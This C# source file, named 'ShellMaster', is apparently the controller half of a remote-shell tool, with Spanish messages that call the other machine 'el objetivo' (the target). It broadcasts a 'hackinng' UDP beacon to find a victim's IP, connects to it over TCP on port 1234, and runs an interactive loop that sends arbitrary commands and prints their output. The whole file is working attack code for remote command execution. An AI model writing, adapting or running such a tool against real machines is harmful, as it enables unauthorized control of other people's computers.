using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace ShellMaster
{
    class Program
    {
        static UdpClient client = new UdpClient();

        static void Main(string[] args)
        {
            bool flag = true;
            
            IPEndPoint ep = new IPEndPoint(IPAddress.Parse("255.255.255.255"), 15000);
            string msg = "hackinng," + LocalIPAddress();
            byte[] data = Encoding.ASCII.GetBytes(msg);
            client.Send(data, data.Length, ep);
            Console.WriteLine("Se envio paquete objetivo");
            Byte[] receiveBytes = client.Receive(ref ep);
            string ipTarjet = Encoding.ASCII.GetString(receiveBytes);

            client.Close();
            if (ipTarjet != null)
            {
                Thread.Sleep(2000);
                try
                {
                    TcpClient tclient = new TcpClient();

                    Console.WriteLine("conectando con el objetivo");
                    tclient.Connect(ipTarjet,1234);
                    Console.WriteLine("conectado con el objetivo");
                    while (true)
                    {
                        Console.Write("comando->");
                        string mensaje = Console.ReadLine();

                        Stream stream = tclient.GetStream();
                        byte[] enviar = Encoding.UTF8.GetBytes(mensaje);
                        stream.Write(enviar, 0, enviar.Length);

                        byte[] tamano = new byte[254];
                        stream.Read(tamano,0,254);

                        int buffertamano=Convert.ToInt32(Encoding.UTF8.GetString(tamano));
                        byte[] datos = new byte[buffertamano];
                        stream.Read(datos, 0,buffertamano);
                        string misdatos = Encoding.UTF8.GetString(datos);
                        Console.WriteLine(misdatos);

                        if (mensaje=="exit")
                        {
                            break;
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
            Console.WriteLine("Presiona una tecla para salir");
            Console.ReadKey();
        }


        static string LocalIPAddress()
        {
            IPHostEntry host;
            string localIP = "";
            host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (IPAddress ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    localIP = ip.ToString();
                    break;
                }
            }
            return localIP;
        }
    }
}
